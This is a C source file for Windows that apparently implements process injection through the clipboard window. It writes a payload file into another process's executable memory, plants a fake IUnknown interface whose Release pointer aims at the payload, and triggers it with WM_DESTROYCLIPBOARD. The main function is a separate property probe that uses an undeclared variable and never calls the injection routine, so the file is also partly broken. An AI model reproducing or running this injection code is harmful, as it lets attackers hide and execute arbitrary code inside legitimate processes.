
#define UNICODE
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

typedef struct _IUnknown_t {
    ULONG_PTR AddRef;
    ULONG_PTR QueryInterface;
    ULONG_PTR Release;
    // the following stores pointer to virtual function table
    ULONG_PTR lpVtbl;
} IUnknown_t;

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID clipboard(LPVOID payload, DWORD payloadSize) {
    HANDLE     hp;
    HWND       hw;
    DWORD      id, wr;
    IUnknown_t iu;
    LPVOID     cs, ds;
    
    // 1. Find a private clipboard
    hw = FindWindowEx(HWND_MESSAGE, NULL, L"CLIPBRDWNDCLASS", NULL);
    
    // 2. Obtain the process id
    GetWindowThreadProcessId(hw, &id);

    // 3. Open process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 4. Allocate RWX memory and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        
    // 5. Initialize the interface
    iu.Release = cs;
    
    // 6. Allocate RW memory and write IUnknown interface
    ds = VirtualAllocEx(hp, NULL, sizeof(IUnknown_t),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hp, ds, &iu, sizeof(IUnknown_t), &wr);
    
    // 7. Set the interface property
    SetProp(hw, L"ClipboardDataObjectInterface", ds);

    // 8. Trigger execution of the payload
    PostMessage(hw, WM_DESTROYCLIPBOARD, 0, 0);
    
    // 9. Release memory for code and data
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(hp);
}
    
int main(int argc, char *argv[]) {

        
    if(argc != 2) {
      printf("usage: clip <window handle>\n");
      return 0;
    }
    
    hw = (HWND)strtoul(argv[1], NULL, 16);

    SetProp(hw, L"ClipboardDataObjectInterface",     0x12345678);
    SetProp(hw, L"ClipboardRootDataObjectInterface", 0x12345678);
    SetProp(hw, L"ClipboardDataObjectInterfaceMTA",  0x12345678);
    
    printf("ClipboardDataObjectInterface     : %p\n", GetProp(hw, L"ClipboardDataObjectInterface"));
    printf("ClipboardRootDataObjectInterface : %p\n", GetProp(hw, L"ClipboardRootDataObjectInterface"));
    printf("ClipboardDataObjectInterfaceMTA  : %p\n", GetProp(hw, L"ClipboardDataObjectInterfaceMTA" ));
    printf("OLEClipPackgeOwner               : %p\n", GetProp(hw, L"OLEClipPackgeOwner"));
    printf("OleClipProcessOwner              : %p\n", GetProp(hw, L"OleClipProcessOwner"));
    
    SendMessage(hw, WM_DESTROYCLIPBOARD, 0, 0);
    return 0;
}

/**

Use SetProp() with "ClipboardDataObjectInterface" on the CLIPBRDWNDCLASS window handle.

*/